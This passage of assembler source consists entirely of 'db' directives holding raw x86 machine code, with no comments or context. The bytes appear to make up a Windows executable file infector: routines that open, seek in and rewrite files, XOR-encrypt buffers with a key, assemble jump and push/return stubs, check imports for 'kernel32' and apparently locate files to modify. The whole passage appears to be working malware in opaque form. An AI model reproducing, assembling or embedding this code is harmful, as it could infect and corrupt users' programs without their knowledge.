db 00eh, 000h, 000h, 089h, 045h, 0f4h, 033h, 0c0h, 033h, 0ffh, 089h, 045h, 008h, 085h
db 0f6h, 089h, 07dh, 0ech, 00fh, 086h, 08ch, 001h, 000h, 000h, 0bbh, 000h, 002h, 000h
db 000h, 08bh, 04dh, 01ch, 08dh, 090h, 000h, 002h, 000h, 000h, 03bh, 0d1h, 089h, 055h
db 0f0h, 073h, 036h, 08dh, 085h, 0a4h, 0fdh, 0ffh, 0ffh, 053h, 050h, 0e8h, 0b1h, 00fh
db 000h, 000h, 0ffh, 075h, 0fch, 08dh, 085h, 0a4h, 0fdh, 0ffh, 0ffh, 06ah, 001h, 053h
db 050h, 0ffh, 015h, 0a8h, 050h, 000h, 000h, 083h, 0c4h, 018h, 085h, 0c0h, 00fh, 084h
db 045h, 001h, 000h, 000h, 08bh, 045h, 0f0h, 089h, 045h, 008h, 0e9h, 030h, 001h, 000h
db 000h, 03bh, 0c1h, 073h, 037h, 08bh, 0f1h, 02bh, 0f0h, 08dh, 085h, 0a4h, 0fdh, 0ffh
db 0ffh, 056h, 050h, 0e8h, 073h, 00fh, 000h, 000h, 0ffh, 075h, 0fch, 08dh, 085h, 0a4h
db 0fdh, 0ffh, 0ffh, 06ah, 001h, 056h, 050h, 0ffh, 015h, 0a8h, 050h, 000h, 000h, 083h
db 0c4h, 018h, 085h, 0c0h, 00fh, 084h, 007h, 001h, 000h, 000h, 08bh, 045h, 01ch, 0e9h
db 0efh, 000h, 000h, 000h, 08bh, 045h, 018h, 003h, 0c1h, 03bh, 0d0h, 089h, 045h, 0e4h
db 073h, 03ah, 033h, 0c0h, 08bh, 04dh, 014h, 083h, 0c0h, 004h, 08bh, 00ch, 00fh, 083h
db 0c7h, 004h, 033h, 04dh, 0f4h, 03bh, 0c3h, 089h, 08ch, 005h, 0a0h, 0fdh, 0ffh, 0ffh
db 072h, 0e6h, 0ffh, 075h, 0fch, 08dh, 085h, 0a4h, 0fdh, 0ffh, 0ffh, 089h, 07dh, 0ech
db 06ah, 001h, 053h, 050h, 0ffh, 015h, 0a8h, 050h, 000h, 000h, 083h, 0c4h, 010h, 0e9h
db 06ch, 0ffh, 0ffh, 0ffh, 039h, 045h, 008h, 073h, 06eh, 08bh, 045h, 018h, 03bh, 0f8h
db 073h, 02ch, 08bh, 04dh, 014h, 02bh, 0c7h, 08dh, 014h, 00fh, 08bh, 0c8h, 08bh, 0f2h
db 08bh, 0d1h, 08dh, 0bdh, 0a4h, 0fdh, 0ffh, 0ffh, 0c1h, 0e9h, 002h, 0f3h, 0a5h, 08bh
db 0cah, 083h, 0e1h, 003h, 001h, 045h, 0ech, 0f3h, 0a4h, 08bh, 07dh, 0ech, 08bh, 075h
db 010h, 08bh, 04dh, 01ch, 033h, 0c0h, 08bh, 055h, 0f4h, 031h, 094h, 005h, 0a4h, 0fdh
db 0ffh, 0ffh, 083h, 0c0h, 004h, 03bh, 0c3h, 072h, 0efh, 02bh, 04dh, 008h, 0ffh, 075h
db 0fch, 08dh, 085h, 0a4h, 0fdh, 0ffh, 0ffh, 003h, 04dh, 018h, 06ah, 001h, 051h, 050h
db 0ffh, 015h, 0a8h, 050h, 000h, 000h, 083h, 0c4h, 010h, 085h, 0c0h, 074h, 04eh, 08bh
db 045h, 0e4h, 0e9h, 004h, 0ffh, 0ffh, 0ffh, 039h, 075h, 0f0h, 00fh, 082h, 0cdh, 0feh
db 0ffh, 0ffh, 02bh, 075h, 008h, 08dh, 085h, 0a4h, 0fdh, 0ffh, 0ffh, 056h, 050h, 0e8h
db 07bh, 00eh, 000h, 000h, 0ffh, 075h, 0fch, 08dh, 085h, 0a4h, 0fdh, 0ffh, 0ffh, 06ah
db 001h, 056h, 050h, 0ffh, 015h, 0a8h, 050h, 000h, 000h, 083h, 0c4h, 018h, 085h, 0c0h
db 074h, 013h, 08bh, 045h, 010h, 08bh, 075h, 010h, 089h, 045h, 008h, 03bh, 0c6h, 00fh
db 082h, 082h, 0feh, 0ffh, 0ffh, 0ebh, 007h, 0c7h, 045h, 0f8h, 001h, 000h, 000h, 000h
db 08bh, 045h, 01ch, 08bh, 04dh, 00ch, 003h, 0c1h, 06ah, 000h, 003h, 045h, 020h, 050h
db 0ffh, 075h, 0fch, 0ffh, 015h, 0ach, 050h, 000h, 000h, 0ffh, 075h, 0fch, 08bh, 085h
db 0d4h, 0fch, 0ffh, 0ffh, 033h, 045h, 0f4h, 06ah, 001h, 05eh, 089h, 045h, 0e8h, 056h
db 08dh, 045h, 0e8h, 06ah, 004h, 050h, 0ffh, 015h, 0a8h, 050h, 000h, 000h, 083h, 0c4h
db 01ch, 085h, 0c0h, 075h, 00ch, 089h, 075h, 0f8h, 0ebh, 007h, 0c7h, 045h, 0f8h, 001h
db 000h, 000h, 000h, 083h, 07dh, 0fch, 000h, 05fh, 05eh, 05bh, 074h, 00ah, 0ffh, 075h
db 0fch, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 059h, 08bh, 045h, 0f8h, 0f7h, 0d8h, 01bh
db 0c0h, 0f7h, 0d0h, 023h, 045h, 0f4h, 0c9h, 0c3h, 055h, 08bh, 0ech, 081h, 0ech, 014h
db 009h, 000h, 000h, 053h, 056h, 057h, 033h, 0ffh, 068h, 0ffh, 003h, 000h, 000h, 057h
db 089h, 07dh, 0f8h, 089h, 07dh, 0fch, 0e8h, 00fh, 00dh, 000h, 000h, 08bh, 0f0h, 06ah
db 001h, 003h, 075h, 010h, 056h, 0ffh, 075h, 008h, 0e8h, 036h, 0f3h, 0ffh, 0ffh, 08bh
db 0d8h, 083h, 0c4h, 014h, 03bh, 0dfh, 00fh, 084h, 076h, 001h, 000h, 000h, 0ffh, 075h
db 014h, 08dh, 045h, 0f8h, 050h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 056h, 053h, 0ffh
db 075h, 008h, 0e8h, 04dh, 0fch, 0ffh, 0ffh, 083h, 0c4h, 01ch, 03bh, 0c7h, 089h, 045h
db 00ch, 00fh, 084h, 051h, 001h, 000h, 000h, 068h, 0ffh, 08fh, 001h, 000h, 068h, 000h
db 050h, 000h, 000h, 0e8h, 0beh, 00ch, 000h, 000h, 08bh, 0f0h, 06ah, 001h, 056h, 089h
db 075h, 0f4h, 0ffh, 015h, 0d4h, 050h, 000h, 000h, 083h, 0c4h, 010h, 03bh, 0c7h, 089h
db 045h, 014h, 00fh, 084h, 026h, 001h, 000h, 000h, 08dh, 085h, 0ech, 0f6h, 0ffh, 0ffh
db 050h, 0ffh, 075h, 008h, 0e8h, 0dah, 0f0h, 0ffh, 0ffh, 059h, 085h, 0c0h, 059h, 00fh
db 084h, 003h, 001h, 000h, 000h, 08bh, 045h, 0f8h, 003h, 0c3h, 050h, 08dh, 085h, 0ech
db 0f6h, 0ffh, 0ffh, 050h, 0e8h, 0f0h, 0f1h, 0ffh, 0ffh, 059h, 03bh, 0c7h, 059h, 00fh
db 084h, 0e7h, 000h, 000h, 000h, 0ffh, 075h, 00ch, 0ffh, 075h, 010h, 050h, 056h, 0ffh
db 075h, 014h, 0e8h, 0eah, 0eeh, 0ffh, 0ffh, 083h, 0c4h, 014h, 085h, 0c0h, 00fh, 084h
db 0cch, 000h, 000h, 000h, 06ah, 002h, 056h, 0ffh, 075h, 008h, 0e8h, 07eh, 0f2h, 0ffh
db 0ffh, 08bh, 0d8h, 083h, 0c4h, 00ch, 03bh, 0dfh, 00fh, 084h, 0b4h, 000h, 000h, 000h
db 08dh, 085h, 0ech, 0f6h, 0ffh, 0ffh, 050h, 0ffh, 075h, 008h, 0e8h, 072h, 0f0h, 0ffh
db 0ffh, 059h, 085h, 0c0h, 059h, 00fh, 084h, 09bh, 000h, 000h, 000h, 08dh, 085h, 0ech
db 0f6h, 0ffh, 0ffh, 053h, 050h, 0e8h, 08dh, 0f1h, 0ffh, 0ffh, 02bh, 085h, 060h, 0f7h
db 0ffh, 0ffh, 068h, 074h, 014h, 000h, 000h, 0ffh, 075h, 008h, 089h, 085h, 054h, 0f7h
db 0ffh, 0ffh, 0ffh, 015h, 09ch, 050h, 000h, 000h, 08bh, 0f0h, 083h, 0c4h, 010h, 03bh
db 0f7h, 074h, 06bh, 057h, 053h, 056h, 0ffh, 015h, 0ach, 050h, 000h, 000h, 056h, 06ah
db 001h, 0ffh, 075h, 0f4h, 0ffh, 075h, 014h, 0ffh, 015h, 0a8h, 050h, 000h, 000h, 083h
db 0c4h, 01ch, 085h, 0c0h, 074h, 044h, 057h, 06ah, 03ch, 056h, 0ffh, 015h, 0ach, 050h
db 000h, 000h, 056h, 06ah, 001h, 08dh, 045h, 0fch, 06ah, 004h, 050h, 0ffh, 015h, 0a4h
db 050h, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 074h, 024h, 08bh, 045h, 0fch, 057h
db 083h, 0c0h, 028h, 050h, 056h, 0ffh, 015h, 0ach, 050h, 000h, 000h, 056h, 06ah, 001h
db 08dh, 085h, 054h, 0f7h, 0ffh, 0ffh, 06ah, 004h, 050h, 0ffh, 015h, 0a8h, 050h, 000h
db 000h, 083h, 0c4h, 01ch, 056h, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 059h, 0ffh, 075h
db 014h, 0ffh, 015h, 0d8h, 050h, 000h, 000h, 059h, 05fh, 05eh, 033h, 0c0h, 05bh, 0c9h
db 0c3h, 055h, 08bh, 0ech, 081h, 0ech, 010h, 009h, 000h, 000h, 053h, 056h, 057h, 06ah
db 014h, 06ah, 00ah, 0e8h, 060h, 00bh, 000h, 000h, 08bh, 07dh, 010h, 0c1h, 0e0h, 00ah
db 001h, 045h, 014h, 057h, 06ah, 001h, 0ffh, 015h, 0d4h, 050h, 000h, 000h, 08bh, 0f0h
db 083h, 0c4h, 010h, 085h, 0f6h, 00fh, 084h, 0f8h, 000h, 000h, 000h, 085h, 0ffh, 076h
db 012h, 08bh, 045h, 00ch, 08bh, 0ceh, 02bh, 0c6h, 08bh, 0d7h, 08ah, 01ch, 008h, 088h
db 019h, 041h, 04ah, 075h, 0f7h, 08bh, 045h, 018h, 033h, 0dbh, 06ah, 064h, 06ah, 00ah
db 089h, 01ch, 006h, 089h, 07dh, 0fch, 0e8h, 065h, 00bh, 000h, 000h, 059h, 085h, 0c0h
db 059h, 076h, 052h, 08dh, 045h, 0f8h, 050h, 0ffh, 075h, 0fch, 056h, 0e8h, 092h, 0d7h
db 0ffh, 0ffh, 056h, 08bh, 0f8h, 0ffh, 015h, 0d8h, 050h, 000h, 000h, 083h, 0c4h, 010h
db 085h, 0ffh, 00fh, 084h, 0a7h, 000h, 000h, 000h, 08dh, 045h, 0fch, 050h, 0ffh, 075h
db 0f8h, 057h, 0e8h, 071h, 0d7h, 0ffh, 0ffh, 057h, 08bh, 0f0h, 0ffh, 015h, 0d8h, 050h
db 000h, 000h, 083h, 0c4h, 010h, 085h, 0f6h, 00fh, 084h, 086h, 000h, 000h, 000h, 06ah
db 064h, 06ah, 00ah, 043h, 0e8h, 013h, 00bh, 000h, 000h, 059h, 03bh, 0d8h, 059h, 072h
db 0aeh, 0ffh, 075h, 008h, 08bh, 07dh, 0fch, 0e8h, 0c3h, 0f3h, 0ffh, 0ffh, 085h, 0c0h
db 059h, 075h, 009h, 056h, 0ffh, 015h, 0d8h, 050h, 000h, 000h, 0ebh, 05ch, 08bh, 045h
db 014h, 003h, 0c7h, 050h, 0ffh, 075h, 008h, 0e8h, 0c1h, 0f6h, 0ffh, 0ffh, 08bh, 0d8h
db 059h, 085h, 0dbh, 059h, 074h, 0e1h, 068h, 074h, 014h, 000h, 000h, 0ffh, 075h, 008h
db 0ffh, 015h, 09ch, 050h, 000h, 000h, 059h, 089h, 045h, 010h, 085h, 0c0h, 059h, 074h
db 0cah, 06ah, 000h, 053h, 050h, 0ffh, 015h, 0ach, 050h, 000h, 000h, 0ffh, 075h, 010h
db 06ah, 001h, 057h, 056h, 0ffh, 015h, 0a8h, 050h, 000h, 000h, 083h, 0c4h, 01ch, 085h
db 0c0h, 075h, 016h, 056h, 0ffh, 015h, 0d8h, 050h, 000h, 000h, 0ffh, 075h, 010h, 0ffh
db 015h, 0a0h, 050h, 000h, 000h, 059h, 059h, 033h, 0c0h, 0ebh, 07ch, 0ffh, 075h, 014h
db 06ah, 001h, 0ffh, 015h, 0d4h, 050h, 000h, 000h, 059h, 089h, 045h, 00ch, 085h, 0c0h
db 059h, 074h, 026h, 0ffh, 075h, 014h, 050h, 0e8h, 0d7h, 00ah, 000h, 000h, 0ffh, 075h
db 010h, 06ah, 001h, 0ffh, 075h, 014h, 0ffh, 075h, 00ch, 0ffh, 015h, 0a8h, 050h, 000h
db 000h, 0ffh, 075h, 00ch, 0ffh, 015h, 0d8h, 050h, 000h, 000h, 083h, 0c4h, 01ch, 0ffh
db 075h, 010h, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 056h, 0ffh, 015h, 0d8h, 050h, 000h
db 000h, 08dh, 085h, 0f0h, 0f6h, 0ffh, 0ffh, 050h, 0ffh, 075h, 008h, 0e8h, 033h, 0eeh
db 0ffh, 0ffh, 08dh, 085h, 0f0h, 0f6h, 0ffh, 0ffh, 053h, 050h, 0e8h, 09ah, 0efh, 0ffh
db 0ffh, 003h, 0dfh, 053h, 050h, 08dh, 085h, 0f0h, 0f6h, 0ffh, 0ffh, 050h, 0ffh, 075h
db 008h, 0e8h, 008h, 000h, 000h, 000h, 083h, 0c4h, 028h, 05fh, 05eh, 05bh, 0c9h, 0c3h
db 055h, 08bh, 0ech, 083h, 0ech, 018h, 056h, 08dh, 045h, 0f4h, 057h, 050h, 08bh, 07dh
db 00ch, 08dh, 045h, 0f0h, 050h, 08dh, 045h, 0f8h, 050h, 08dh, 045h, 0ech, 050h, 057h
db 0ffh, 075h, 008h, 033h, 0f6h, 089h, 075h, 0f8h, 089h, 075h, 0f0h, 089h, 075h, 0f4h
db 089h, 075h, 0e8h, 089h, 075h, 0ech, 0e8h, 070h, 002h, 000h, 000h, 083h, 0c4h, 018h
db 085h, 0c0h, 074h, 017h, 068h, 074h, 014h, 000h, 000h, 0ffh, 075h, 008h, 0ffh, 015h
db 09ch, 050h, 000h, 000h, 059h, 03bh, 0c6h, 059h, 089h, 045h, 0fch, 075h, 007h, 033h
db 0c0h, 0e9h, 047h, 002h, 000h, 000h, 0ffh, 075h, 014h, 057h, 0e8h, 01ch, 0efh, 0ffh
db 0ffh, 08bh, 04fh, 074h, 08bh, 055h, 010h, 003h, 0d1h, 02bh, 04dh, 0f8h, 068h, 000h
db 028h, 000h, 000h, 06ah, 001h, 003h, 0c8h, 089h, 055h, 010h, 089h, 04dh, 0e8h, 0ffh
db 015h, 0d4h, 050h, 000h, 000h, 08bh, 0f8h, 083h, 0c4h, 010h, 03bh, 0feh, 00fh, 084h
db 005h, 002h, 000h, 000h, 053h, 0bbh, 000h, 002h, 000h, 000h, 053h, 06ah, 001h, 0e8h
db 026h, 009h, 000h, 000h, 050h, 08dh, 047h, 005h, 050h, 068h, 0ffh, 000h, 000h, 000h
db 056h, 056h, 056h, 06ah, 007h, 0e8h, 081h, 0d6h, 0ffh, 0ffh, 08bh, 0f0h, 053h, 083h
db 0c6h, 005h, 06ah, 001h, 0c6h, 004h, 03eh, 060h, 046h, 0e8h, 000h, 009h, 000h, 000h
db 050h, 08dh, 004h, 03eh, 050h, 033h, 0c0h, 06ah, 010h, 050h, 050h, 050h, 06ah, 007h
db 0e8h, 05ch, 0d6h, 0ffh, 0ffh, 083h, 0c4h, 048h, 003h, 0f0h, 080h, 00ch, 03eh, 0ffh
db 0ffh, 075h, 00ch, 046h, 0ffh, 075h, 008h, 0c6h, 004h, 03eh, 035h, 046h, 0e8h, 0b9h
db 002h, 000h, 000h, 053h, 089h, 004h, 03eh, 06ah, 001h, 083h, 0c6h, 004h, 0e8h, 0c5h
db 008h, 000h, 000h, 050h, 08dh, 004h, 03eh, 050h, 033h, 0c0h, 06ah, 010h, 050h, 050h
db 050h, 06ah, 007h, 0e8h, 021h, 0d6h, 0ffh, 0ffh, 003h, 0f0h, 08bh, 045h, 010h, 053h
db 06ah, 001h, 0c6h, 004h, 03eh, 068h, 089h, 044h, 03eh, 001h, 083h, 0c6h, 005h, 0e8h
db 09ah, 008h, 000h, 000h, 050h, 08dh, 004h, 03eh, 050h, 033h, 0c0h, 06ah, 010h, 050h
db 050h, 050h, 06ah, 007h, 0e8h, 0f6h, 0d5h, 0ffh, 0ffh, 083h, 0c4h, 050h, 003h, 0f0h
db 053h, 0c6h, 004h, 03eh, 0c3h, 06ah, 001h, 046h, 0e8h, 075h, 008h, 000h, 000h, 050h
db 08dh, 004h, 03eh, 050h, 033h, 0c0h, 06ah, 010h, 050h, 050h, 050h, 06ah, 007h, 0e8h
db 0d1h, 0d5h, 0ffh, 0ffh, 003h, 0f0h, 06ah, 007h, 06ah, 000h, 0c6h, 007h, 0e9h, 08dh
db 046h, 0fbh, 089h, 047h, 001h, 0e8h, 09ch, 008h, 000h, 000h, 083h, 0c4h, 02ch, 083h
db 0f8h, 004h, 075h, 00dh, 06ah, 007h, 06ah, 000h, 0e8h, 08bh, 008h, 000h, 000h, 059h
db 059h, 0ebh, 0eeh, 004h, 058h, 053h, 088h, 004h, 03eh, 06ah, 001h, 046h, 0e8h, 02bh
db 008h, 000h, 000h, 050h, 08dh, 004h, 03eh, 050h, 033h, 0c0h, 06ah, 010h, 050h, 050h
db 050h, 06ah, 007h, 0e8h, 087h, 0d5h, 0ffh, 0ffh, 003h, 0f0h, 06ah, 0feh, 08dh, 004h
db 03eh, 050h, 06ah, 010h, 0ffh, 075h, 0f4h, 0ffh, 075h, 0f8h, 06ah, 004h, 06ah, 000h
db 0e8h, 06eh, 0d5h, 0ffh, 0ffh, 083h, 0c4h, 040h, 003h, 0f0h, 053h, 06ah, 001h, 0e8h
db 0f2h, 007h, 000h, 000h, 050h, 08dh, 004h, 03eh, 050h, 033h, 0c0h, 06ah, 010h, 050h
db 050h, 050h, 06ah, 007h, 0e8h, 04eh, 0d5h, 0ffh, 0ffh, 003h, 0f0h, 053h, 06ah, 001h
db 0c6h, 004h, 03eh, 061h, 046h, 0e8h, 0d0h, 007h, 000h, 000h, 050h, 08dh, 004h, 03eh
db 050h, 033h, 0c0h, 068h, 0ffh, 000h, 000h, 000h, 050h, 050h, 050h, 06ah, 007h, 0e8h
db 029h, 0d5h, 0ffh, 0ffh, 003h, 0f0h, 083h, 0c4h, 048h, 0c6h, 004h, 03eh, 068h, 08bh
db 045h, 0f0h, 053h, 089h, 044h, 03eh, 001h, 06ah, 001h, 083h, 0c6h, 005h, 0e8h, 09fh
db 007h, 000h, 000h, 050h, 08dh, 004h, 03eh, 050h, 033h, 0dbh, 068h, 0ffh, 000h, 000h
db 000h, 053h, 053h, 053h, 06ah, 007h, 0e8h, 0f8h, 0d4h, 0ffh, 0ffh, 053h, 003h, 0f0h
db 0ffh, 075h, 014h, 0c6h, 004h, 03eh, 0c3h, 0ffh, 075h, 0fch, 0ffh, 015h, 0ach, 050h
db 000h, 000h, 0ffh, 075h, 0fch, 046h, 06ah, 001h, 056h, 057h, 0ffh, 015h, 0a8h, 050h
db 000h, 000h, 083h, 0c4h, 040h, 085h, 0c0h, 075h, 004h, 033h, 0f6h, 0ebh, 025h, 08bh
db 045h, 0ech, 053h, 040h, 050h, 0ffh, 075h, 0fch, 0ffh, 015h, 0ach, 050h, 000h, 000h
db 0ffh, 075h, 0fch, 08dh, 045h, 0e8h, 06ah, 001h, 05eh, 056h, 06ah, 004h, 050h, 0ffh
db 015h, 0a8h, 050h, 000h, 000h, 083h, 0c4h, 01ch, 057h, 0ffh, 015h, 0d8h, 050h, 000h
db 000h, 059h, 05bh, 0ffh, 075h, 0fch, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 059h, 08bh
db 0c6h, 05fh, 05eh, 0c9h, 0c3h, 055h, 08bh, 0ech, 083h, 0ech, 028h, 053h, 056h, 057h
db 068h, 074h, 014h, 000h, 000h, 0ffh, 075h, 008h, 0ffh, 015h, 09ch, 050h, 000h, 000h
db 08bh, 0f0h, 059h, 085h, 0f6h, 059h, 089h, 075h, 008h, 074h, 046h, 08bh, 05dh, 00ch
db 06ah, 000h, 08bh, 043h, 03ch, 005h, 0f8h, 000h, 000h, 000h, 050h, 056h, 0ffh, 015h
db 0ach, 050h, 000h, 000h, 056h, 06ah, 001h, 08dh, 045h, 0d8h, 06ah, 028h, 050h, 0ffh
db 015h, 0a4h, 050h, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 074h, 013h, 0ffh, 075h
db 0e8h, 06ah, 001h, 0ffh, 015h, 0d4h, 050h, 000h, 000h, 08bh, 0f8h, 059h, 085h, 0ffh
db 059h, 075h, 00fh, 056h, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 059h, 033h, 0c0h, 0e9h
db 091h, 000h, 000h, 000h, 06ah, 000h, 0ffh, 075h, 0ech, 056h, 0ffh, 015h, 0ach, 050h
db 000h, 000h, 056h, 06ah, 001h, 0ffh, 075h, 0e8h, 057h, 0ffh, 015h, 0a4h, 050h, 000h
db 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 075h, 004h, 033h, 0f6h, 0ebh, 059h, 08bh, 0f7h
db 056h, 0e8h, 058h, 004h, 000h, 000h, 003h, 0f0h, 059h, 085h, 0c0h, 07eh, 0edh, 08bh
db 045h, 0e8h, 08dh, 044h, 038h, 09ch, 03bh, 0f0h, 077h, 0e2h, 080h, 03eh, 0e8h, 075h
db 0e3h, 0e8h, 0ebh, 005h, 000h, 000h, 0a8h, 001h, 074h, 0dah, 08bh, 045h, 0ech, 08bh
db 04dh, 010h, 02bh, 0c7h, 08bh, 055h, 01ch, 003h, 0c6h, 06ah, 001h, 089h, 001h, 08bh
db 043h, 074h, 08bh, 04dh, 014h, 02bh, 0c7h, 003h, 045h, 0e4h, 003h, 0c6h, 089h, 001h
db 08bh, 046h, 001h, 089h, 002h, 08bh, 009h, 05eh, 08dh, 044h, 001h, 005h, 08bh, 04dh
db 018h, 089h, 001h, 0ffh, 075h, 008h, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 057h, 0ffh
db 015h, 0d8h, 050h, 000h, 000h, 059h, 08bh, 0c6h, 059h, 05fh, 05eh, 05bh, 0c9h, 0c3h
db 055h, 08bh, 0ech, 083h, 0ech, 01ch, 053h, 056h, 057h, 068h, 074h, 014h, 000h, 000h
db 0ffh, 075h, 008h, 0ffh, 015h, 09ch, 050h, 000h, 000h, 08bh, 0f0h, 059h, 085h, 0f6h
db 059h, 00fh, 084h, 0f7h, 000h, 000h, 000h, 08bh, 05dh, 00ch, 0ffh, 0b3h, 0c0h, 000h
db 000h, 000h, 053h, 0e8h, 0e1h, 0ebh, 0ffh, 0ffh, 06ah, 000h, 050h, 056h, 0ffh, 015h
db 0ach, 050h, 000h, 000h, 083h, 0c4h, 014h, 056h, 06ah, 001h, 08dh, 045h, 0e4h, 06ah
db 014h, 050h, 0ffh, 015h, 0a4h, 050h, 000h, 000h, 083h, 0c4h, 010h, 085h, 0c0h, 00fh
db 084h, 0b9h, 000h, 000h, 000h, 083h, 07dh, 0e4h, 000h, 056h, 00fh, 084h, 0afh, 000h
db 000h, 000h, 0ffh, 015h, 0b4h, 050h, 000h, 000h, 059h, 08bh, 0f8h, 06ah, 000h, 0ffh
db 075h, 0f0h, 053h, 0e8h, 09bh, 0ebh, 0ffh, 0ffh, 059h, 059h, 050h, 056h, 0ffh, 015h
db 0ach, 050h, 000h, 000h, 056h, 06ah, 001h, 08dh, 045h, 0f8h, 06ah, 008h, 050h, 0ffh
db 015h, 0a4h, 050h, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 074h, 07ah, 06ah, 000h
db 057h, 056h, 0ffh, 015h, 0ach, 050h, 000h, 000h, 083h, 0c4h, 00ch, 080h, 07dh, 0f8h
db 06bh, 074h, 006h, 080h, 07dh, 0f8h, 04bh, 075h, 08eh, 080h, 07dh, 0f9h, 065h, 074h
db 006h, 080h, 07dh, 0f9h, 045h, 075h, 082h, 080h, 07dh, 0fah, 072h, 074h, 00ah, 080h
db 07dh, 0fah, 052h, 00fh, 085h, 072h, 0ffh, 0ffh, 0ffh, 080h, 07dh, 0fbh, 06eh, 074h
db 00ah, 080h, 07dh, 0fbh, 04eh, 00fh, 085h, 062h, 0ffh, 0ffh, 0ffh, 080h, 07dh, 0fch
db 065h, 074h, 00ah, 080h, 07dh, 0fch, 045h, 00fh, 085h, 052h, 0ffh, 0ffh, 0ffh, 080h
db 07dh, 0fdh, 06ch, 074h, 00ah, 080h, 07dh, 0fdh, 04ch, 00fh, 085h, 042h, 0ffh, 0ffh
db 0ffh, 080h, 07dh, 0feh, 033h, 00fh, 085h, 038h, 0ffh, 0ffh, 0ffh, 080h, 07dh, 0ffh
db 032h, 074h, 011h, 0e9h, 02dh, 0ffh, 0ffh, 0ffh, 056h, 0ffh, 015h, 0a0h, 050h, 000h
db 000h, 059h, 033h, 0c0h, 0ebh, 00eh, 056h, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 08bh
db 043h, 074h, 059h, 003h, 045h, 0f4h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 055h, 08bh, 0ech
db 056h, 08bh, 075h, 008h, 056h, 0e8h, 07ch, 0f3h, 0ffh, 0ffh, 085h, 0c0h, 059h, 074h
db 057h, 0e8h, 055h, 004h, 000h, 000h, 0a8h, 001h, 074h, 007h, 056h, 0e8h, 0adh, 0f2h
db 0ffh, 0ffh, 059h, 0e8h, 045h, 004h, 000h, 000h, 0a8h, 001h, 074h, 026h, 0ffh, 075h
db 014h, 068h, 0c8h, 000h, 000h, 000h, 06ah, 064h, 0e8h, 0fdh, 004h, 000h, 000h, 059h
db 059h, 0c1h, 0e0h, 00ah, 050h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 056h, 0e8h, 028h
db 0f9h, 0ffh, 0ffh, 083h, 0c4h, 014h, 0ebh, 018h, 0ffh, 075h, 01ch, 0ffh, 075h, 018h
db 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 056h, 0e8h, 055h, 0f7h, 0ffh
db 0ffh, 083h, 0c4h, 018h, 05eh, 05dh, 0c3h, 055h, 08bh, 0ech, 081h, 0ech, 050h, 003h
db 000h, 000h, 08bh, 045h, 008h, 053h, 033h, 0dbh, 033h, 0c9h, 056h, 03bh, 0c3h, 057h
db 089h, 05dh, 0fch, 00fh, 084h, 0b8h, 001h, 000h, 000h, 08ah, 010h, 06ah, 001h, 08dh
db 0b5h, 0f4h, 0feh, 0ffh, 0ffh, 05fh, 02bh, 0f0h, 02bh, 0f8h, 0ebh, 002h, 033h, 0dbh
db 088h, 014h, 006h, 08ah, 050h, 001h, 041h, 040h, 03ah, 0d3h, 074h, 01eh, 08dh, 01ch
db 007h, 081h, 0fbh, 004h, 001h, 000h, 000h, 00fh, 084h, 08ah, 001h, 000h, 000h, 081h
db 0f9h, 004h, 001h, 000h, 000h, 072h, 0dbh, 08bh, 07dh, 0fch, 033h, 0dbh, 0ebh, 046h
db 08dh, 051h, 001h, 0beh, 004h, 001h, 000h, 000h, 03bh, 0d6h, 00fh, 083h, 06bh, 001h
db 000h, 000h, 080h, 0bch, 00dh, 0f3h, 0feh, 0ffh, 0ffh, 05ch, 08dh, 084h, 00dh, 0f4h
db 0feh, 0ffh, 0ffh, 074h, 019h, 083h, 0c1h, 002h, 03bh, 0ceh, 00fh, 083h, 04fh, 001h
db 000h, 000h, 08bh, 0cah, 0c6h, 000h, 05ch, 08dh, 084h, 00dh, 0f4h, 0feh, 0ffh, 0ffh
db 088h, 018h, 0c6h, 000h, 02ah, 08bh, 0f8h, 088h, 09ch, 00dh, 0f5h, 0feh, 0ffh, 0ffh
db 08ah, 08dh, 0f4h, 0feh, 0ffh, 0ffh, 033h, 0c0h, 03ah, 0cbh, 074h, 011h, 088h, 08ch
db 005h, 0b0h, 0fch, 0ffh, 0ffh, 08ah, 08ch, 005h, 0f5h, 0feh, 0ffh, 0ffh, 040h, 0ebh
db 0ebh, 088h, 09ch, 005h, 0b0h, 0fch, 0ffh, 0ffh, 0a1h, 0f0h, 050h, 000h, 000h, 03bh
db 0c3h, 075h, 018h, 068h, 0a8h, 014h, 000h, 000h, 0ffh, 015h, 094h, 050h, 000h, 000h
db 03bh, 0c3h, 0a3h, 0f0h, 050h, 000h, 000h, 00fh, 084h, 0f0h, 000h, 000h, 000h, 068h
db 098h, 014h, 000h, 000h, 050h, 0ffh, 015h, 098h, 050h, 000h, 000h, 068h, 088h, 014h
db 000h, 000h, 08bh, 0f0h, 0ffh, 035h, 0f0h, 050h, 000h, 000h, 0ffh, 015h, 098h, 050h
db 000h, 000h, 068h, 07ch, 014h, 000h, 000h, 089h, 045h, 008h, 0ffh, 035h, 0f0h, 050h
db 000h, 000h, 0ffh, 015h, 098h, 050h, 000h, 000h, 03bh, 0f3h, 089h, 045h, 0fch, 00fh
db 084h, 0b2h, 000h, 000h, 000h, 039h, 05dh, 008h, 00fh, 084h, 0a9h, 000h, 000h, 000h
db 08dh, 085h, 0b4h, 0fdh, 0ffh, 0ffh, 050h, 08dh, 085h, 0b0h, 0fch, 0ffh, 0ffh, 050h
db 0ffh, 0d6h, 083h, 0f8h, 0ffh, 089h, 045h, 0f8h, 00fh, 084h, 088h, 000h, 000h, 000h
db 033h, 0c0h, 038h, 09dh, 0e0h, 0fdh, 0ffh, 0ffh, 074h, 062h, 08bh, 0cfh, 08dh, 095h
db 0e0h, 0fdh, 0ffh, 0ffh, 02bh, 0cah, 08bh, 0d0h, 08dh, 0b5h, 0f4h, 0feh, 0ffh, 0ffh
